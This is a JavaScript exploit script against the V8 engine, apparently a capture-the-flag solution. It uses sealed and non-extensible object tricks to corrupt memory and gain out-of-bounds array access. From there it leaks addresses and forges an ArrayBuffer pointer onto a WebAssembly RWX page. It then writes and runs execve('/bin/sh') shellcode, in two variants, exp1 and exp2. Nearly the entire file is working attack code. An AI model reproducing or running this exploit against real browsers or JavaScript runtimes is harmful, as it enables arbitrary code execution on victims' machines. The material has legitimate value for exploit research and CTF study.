function dp(x){%DebugPrint(x);}
const print = console.log;
const assert = function (b, msg)
{
	if (!b)
		throw Error(msg);
};
const buf8 = new ArrayBuffer(8);
const f64 = new Float64Array(buf8);
const u32 = new Uint32Array(buf8);
function d2u(val)
{ //double ==> Uint64
	f64[0] = val;
	let tmp = Array.from(u32);
	return tmp[1] * 0x100000000 + tmp[0];
}
function u2d(val)
{ //Uint64 ==> double
	let tmp = [];
	tmp[0] = parseInt(val % 0x100000000);
	tmp[1] = parseInt((val - tmp[0]) / 0x100000000);
	u32.set(tmp);
	return f64[0];
}
const hex = (x) => ("0x" + x.toString(16));
function getWMain()
{
	const wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
	const wasmModule = new WebAssembly.Module(wasmCode);
	const wasmInstance = new WebAssembly.Instance(wasmModule, {});
	return wasmInstance.exports.main;
}
wmain = getWMain();

function test_hash()
{
	const v2 = {foo:1.1};
	v2[0] = 4;
	v2[1] = 0;
	v2[2] = 0x11;
	v2[3] = 1
	for (var i = 0; i < 0x10 * 3; i++)
	{
		v2[4 + i] = 3 + i;
	}
	v2[4] = 1;
	v2[5] = 0xdead;
	v2[6] = 0xc0;
	v2[i+4] = 1;
	v2[i+5] = 0x1337;
	v2[i+6] = 0xc0;
	Object.seal(v2);
	const v12 = {foo:2.2};
	Object.preventExtensions(v12);
	Object.seal(v12);
	const v18 = {foo:Object};

	v12.a = 0;
	v2.a = 0;
	return v2[1] === 0x1337;
}

/*
//unfortunately these are not good ways to solve the challenge
//since the probability of winning is too low
//I think it is because the third field is not controllable
//so we cannot read and write field easily :(
function get_double_map()
{
	const v2 = {foo2:1.1};
	v2[0] = 4;
	v2[1] = 0;
	v2[2] = 9;
	v2[3] = 1;
	g = [1.1, 2.2, 3.3, 4.4, 5.5,
		1.1, 2.2, 3.3, 4.4, 2.12199579096527231511138221486E-314];
	%DebugPrint(v2);
	%DebugPrint(g);
	Object.seal(v2);
	const v12 = {foo2:2.2};
	Object.preventExtensions(v12);
	Object.seal(v12);
	const v18 = {foo2:Object};

	v12.a = 0;
	v2.a = 0;
	return v2[1];
}
const o = {};
function get_obj_map()
{
	const v2 = {foo3:1.1};
	v2[0] = 4;
	v2[1] = 0;
	v2[2] = 9;
	v2[3] = 1;
	g = [o, o, o, o, o,
		o, o, o, o, 1];
	%DebugPrint(v2);
	%DebugPrint(g);
	Object.seal(v2);
	const v12 = {foo3:2.2};
	Object.preventExtensions(v12);
	Object.seal(v12);
	const v18 = {foo3:Object};

	v12.a = 0;
	v2.a = 0;
	return v2[1];
}

function leaker(o1, o2)
{
	const v2 = {foo4:1.1};
	v2[0] = 4;
	v2[1] = 0;
	v2[2] = 9;
	v2[3] = 1;
	g = [o1, o2, o, o, o,
		o, o, o, o, 1];
	%DebugPrint(v2);
	%DebugPrint(g);
	Object.seal(v2);
	const v12 = {foo4:2.2};
	Object.preventExtensions(v12);
	Object.seal(v12);
	const v18 = {foo4:Object};

	v12.a = 0;
	v2.a = 0;
	readline();
	v2[1] = doubleMap;
}


}*/

function get_double_map()
{
	const v2 = {foo2:1.1};
	v2[0] = 4;
	v2[1] = 0;
	v2[2] = 0x11;
	v2[3] = 1;
	arr = [1.1, 2.2, 3.3, 4.4, 5.5,
		1.1, 2.2, 3.3, 4.4, 5.5, 1.1, 2.2, 3.3,
		1.1, 2.2, 3.3, 4.4, 5.5, 1.1, 2.2, 3.3,
		1.1, 2.2, 3.3, 4.4, 5.5, 1.1, 2.2, 3.3,
		1.1, 2.2, 3.3, 4.4, 2.12199579096527231511138221486E-314];
	Object.seal(v2);
	const v12 = {foo2:2.2};
	Object.preventExtensions(v12);
	Object.seal(v12);
	const v18 = {foo2:Object};
	v12.a = 0;
	v2.a = 0;
	return v2[1];
}

function leaker_faker(wmain, dMap, fakeAbArr)
{
	const v2 = {foo3:1.1};
	v2[0] = 4;
	v2[1] = 0;
	v2[2] = 0x11;
	v2[3] = 1;
	let arr = [0.0, 1.1, 2.2, 3.3, 4.4,
		0.0, 1.1,
		2.12199579096527231511138221486E-314, //Smi(1)
		2.12199579096527231511138221486E-314, //Smi(1)
		4.07423191865332284501385385254E-312, //Smi(0xc0)
		2.2, 3.3, 4.4,
		0.0, 1.1, 2.2, 3.3, 4.4,
		];
	Object.seal(v2);
	const v12 = {foo3:2.2};
	Object.preventExtensions(v12);
	Object.seal(v12);
	const v18 = {foo3:Object};
	v12.a = 0;
	v2.a = 0;
	v2[1] = wmain;
	wmainAddr = d2u(arr[8]);
	v2[1] = dMap;
	abMapAddr = d2u(arr[8])-3600;
	v2[1] = fakeAbArr;
	fakeAbAddr = d2u(arr[8]) + 0x40;
	print(hex(wmainAddr)+' '+hex(abMapAddr)+' '+hex(fakeAbAddr));
	fakeAbArr[0] = u2d(abMapAddr);
	arr[8] = u2d(fakeAbAddr);
	return v2[1];
}
function exp1()
{
	if (!test_hash())
		return false; // 0.5
	const dMap = get_double_map();
	if (dMap == undefined)
		return false; // 0.5
	fakeAbArr = [13.37, 0.0, 0.0,
		u2d(0x321), 1.1, u2d(2), 0.0, 0.0];
	fakeAb = leaker_faker(wmain, dMap, fakeAbArr);
	dp(fakeAb);
	const dataView = new DataView(fakeAb);
	fakeAbArr[4] = u2d(wmainAddr-0x301);
	for (var i = 0; i < 0x300; i+=8)
	{
		rwxAddr = d2u(dataView.getFloat64(i, true));
		if ((rwxAddr / 0x1000) % 0x10 !== 0 &&
			rwxAddr % 0x1000 === 0 &&
			rwxAddr < 0x7fffffffffffff)
			break;
	}
	print(hex(rwxAddr));
	fakeAbArr[4] = u2d(rwxAddr);
	const shellcode = [
    0x99583b6a, 0x2fbb4852,
    0x6e69622f, 0x5368732f,
    0x57525f54, 0x050f5e54
	];
	for (var i = 0; i < shellcode.length; i++)
	{
		dataView.setUint32(i * 4, shellcode[i], true);
	}
	wmain();
}

function corrupt_arr()
{
	const v2 = {foo4:1.1};
	v2[0] = 4;
	v2[1] = 0;
	v2[2] = 0x11;
	v2[3] = 1;
	arr = [1.1, 2.2, 3.3, 4.4, 5.5,
		1.1, 2.2, 3.3, 4.4, 5.5, 1.1, 2.2, 3.3,
		1.1, 2.2, 3.3, 4.4, 5.5, 1.1, 2.2, 3.3,
		1.1, 2.2, 3.3, 4.4, 5.5, 1.1, 2.2, 3.3,
		2.12199579096527231511138221486E-314];
	gOobArr = [13.37];
	gAb = new ArrayBuffer(0x321);
	gSig = {a:0xdead,b:0xbeef,c:wmain};
	Object.seal(v2);
	const v12 = {foo4:2.2};
	Object.preventExtensions(v12);
	Object.seal(v12);
	const v18 = {foo4:Object};
	v12.a = 0;
	v2.a = 0;
	delete v2[30];
	return arr;
}

function exp2()
{
	if (!test_hash())
		return false; // 0.5
	oobArr = corrupt_arr();
	if (oobArr.length === 30)
		return false; // 0.5
	dp(oobArr);
	oobArr[36] = 1.04380972957581745180328891149E-310;
	dp(gOobArr);

	// now gOobArr have OOB access
	// next, we find ArrayBuffer and sig
	var backingPos, wmainAddr;
	for (let i = 0; i < gOobArr.length-2; i++)
	{
		if (d2u(gOobArr[i]) === 0x321)
		{// find ArrayBuffer
			backingPos = i + 1;
		}
		else if (d2u(gOobArr[i]) === 0xdead00000000 &&
			d2u(gOobArr[i+1]) === 0xbeef00000000)
		{// find sig object, and extract wmain address
			wmainAddr = d2u(gOobArr[i+2]) - 1;
		}
		if (backingPos !== undefined && wmainAddr !== undefined)
			break; // otherwise GC is triggered
	}

	assert(backingPos !== undefined, "failed to find ArrayBuffer");
	assert(wmainAddr !== undefined, "failed to find sig array");
	print("[*] index of backing field = " + hex(backingPos));
	print("[*] address of wmain function = " + hex(wmainAddr));
	dp(wmain);

	const dataView = new DataView(gAb);
	gOobArr[backingPos] = u2d(wmainAddr-0x300);
	for (var i = 0; i < 0x300; i+=8)
	{
		rwxAddr = d2u(dataView.getFloat64(i, true));
		if ((rwxAddr / 0x1000) % 0x10 !== 0 &&
			rwxAddr % 0x1000 === 0 &&
			rwxAddr < 0x7fffffffffffff)
			break;
	}

	dp(gAb);

	print("[*] RWX page = " + hex(rwxAddr));

	gOobArr[backingPos] = u2d(rwxAddr);
	// set backing field to rwx page

	var shellcode = [
	    0x99583b6a, 0x2fbb4852,
	    0x6e69622f, 0x5368732f,
	    0x57525f54, 0x050f5e54
	];
	for (var i = 0; i < shellcode.length; i++)
	{
		dataView.setUint32(i * 4, shellcode[i], true);
	}
	// write shellcode to rwx page

	wmain();
	// execute the shellcode
}

if(exp2() === false)
	throw Error("failed to execute shellcode!");